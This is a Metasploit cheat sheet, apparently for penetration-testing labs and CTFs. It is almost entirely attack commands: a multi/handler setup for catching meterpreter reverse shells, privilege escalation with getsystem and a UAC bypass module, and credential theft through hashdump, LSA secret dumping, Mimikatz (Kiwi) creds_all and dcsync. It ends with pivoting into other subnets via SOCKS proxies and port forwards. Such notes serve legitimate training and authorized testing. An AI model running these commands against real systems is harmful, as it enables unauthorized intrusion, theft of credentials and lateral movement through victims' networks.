# Metasploit
```default
  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
  MMMMMMMMMMM                MMMMMMMMMM  
  MMMN$                           vMMMM  
  MMMNl  MMMMM             MMMMM  JMMMM  
  MMMNl  MMMMMMMN       NMMMMMMM  JMMMM  
  MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM  
  MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM  
  MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM  
  MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM  
  MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM  
  MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM  
  MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM  
  MMMMR  ?MMNM             MMMMM .dMMMM  
  MMMMNm `?MMM             MMMM` dMMMMM  
  MMMMMMN  ?MM             MM?  NMMMMMN  
  MMMMMMMMNe                 JMMMMMNMMM  
  MMMMMMMMMMNm,            eMMMMMNMMNMM  
  MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM  
  MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM        
```

Start as sudo/root if you want to bind to low ports.
```bash
sudo msfdb init && sudo msfconsole
```

Basic commands:
```bash
msf> search <module>
msf> use <module>
msf> help
```

In a module, show full module info:
```bash
msf> info
```

In a module only show settable options:
```bash
msf> show options
```

Run module:
```bash
msf> run
```

Run module as background job:
```bash
msf> run -j
msf> jobs
```


## multi/handler

Used to catch reverse shells of all kinds.

```bash
msf> use multi/handler
```

Set it to the payload you used in your msfvenom command.

```bash
msf> set payload windows/meterpreter/reverse_tcp
```

You can set LHOST to your local IP address or just use an interface name.

```bash
msf> set LHOST 192.168.0.2
msf> set LHOST tun0
```

Set the listening port:
```bash
msf> set LPORT 53
```

If you used a binary exploit payload, then also set the correct EXITFUNC.
```bash
msf> set EXITFUNC thread
msf> set EXITFUNC process
msf> set EXITFUNC seh
```

Start listening:
```bash
msf> run
```

You can also set a stage encoder for staged payloads:
```bash
msf> set EnableStageEncoding true
msf> set StageEncoder x86/shikata_ga_nai
```

Migrate to another process automatically after connecting:
```bash
msf> set AutoRunScript post/windows/manage/migrate
```

## Meterpreter

```bash
meterpreter> getuid
meterpreter> sysinfo
meterpreter> shell
```

If you use `shell` to get a CMD shell, then you can use CTRL+Z to background the shell and return to meterpreter.

```bash
# list active channels (shells)
meterpreter> channel -l

# rejoin backgrounded channel (shell)
meterpreter> channel -i 1
```

Migrate to another process
```bash
meterpreter> run post/windows/manage/migrate
```

Background meterpreter sessions (return to msf console)
```bash
meterpreter> background
```

list active sessions
```bash
msf> sessions
```

Rejoin backgrounded session
```bash
msf> sessions -i 2
```

Attempt to elevate to SYSTEM user:
```bash
meterpreter> getsystem
```

Local exploit suggester
```bash
meterpreter> run post/multi/recon/local_exploit_suggester
```

Bypass UAC
```bash
msf> use exploit/windows/local/bypassuac_injection_winsxs
```

Enum applications
```bash
meterpreter> run post/windows/gather/enum_applications
```

Logged in users
```bash
meterpreter> run post/windows/gather/enum_logged_on_users
```

Dump hashes
```bash
meterpreter> run post/windows/gather/hashdump
meterpreter> run post/windows/gather/credentials/credential_collector
```

Dump lsa 
```bash
meterpreter> run post/windows/gather/lsa_secrets
```

ARP_scanner (beware, probably banned in PWK and CTFs)
```bash
run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
```

Check if you are on a virtual machine (honeypot check, but do not rely on this)
```bash
meterpreter> run post/windows/gather/checkvm
```

### Kiwi

Use Mimikatz features in a Meterpreter shell. Be warned though, this might crash your meterpreter shell if the target host is too old to support Mimikatz. 

```bash
meterpreter> load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter> help
```

Retrieve all credentials:

```bash
meterpreter> creds_all
```

Domain Controller Sync (DCSYN):

```bash
meterpreter> dcsync
meterpreter> dcsync_ntlm
```

LSA Dump:

```bash
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
```


Kerberos Tickets:

```bash
meterpreter> kerberos_ticket_list
```


## Pivoting
### SOCKS proxy

Scenario: you have a meterpreter shell (let's say #7) on a machine that is double-homed with a network interface leading to another subnet 10.8.8.0/24

First create a route to the new subnet:
```bash
msf> route add <subnet> <netmask> <meterpreter-session-num>
msf> route add 10.8.8.0 255.255.255.0 7
```

Next start the socks proxy module. The socks proxy will be aware of your routes.
```bash
msf> use auxiliary/server/socks4a
msf> set SRVPORT 1080
msf> run -j
```

Add the following entry at the bottom of `/etc/proxychains.conf`
```bash
socks4  127.0.0.1    1080
```

Now you can use:
```bash
proxychains nmap -T4 -F 10.8.8.42
```
...in order to scan a machine in the other subnet. 
You will probably only be able to TCP CONNECT scan through the socks proxy.

You can create a FoxyProxy setting in order to visit websites in the subnet with Firefox. Make sure to set it to SOCKS4 instead of the default HTTP.


### Single port forward

Some actions works better with a singular port forward instead of SOCKS, such as database interaction or FTP.

```bash
meterpreter> portfwd add -l 3389 -p 3389 -r [target host]

# -l [local-listening-port]
# -p [destination-port]

```

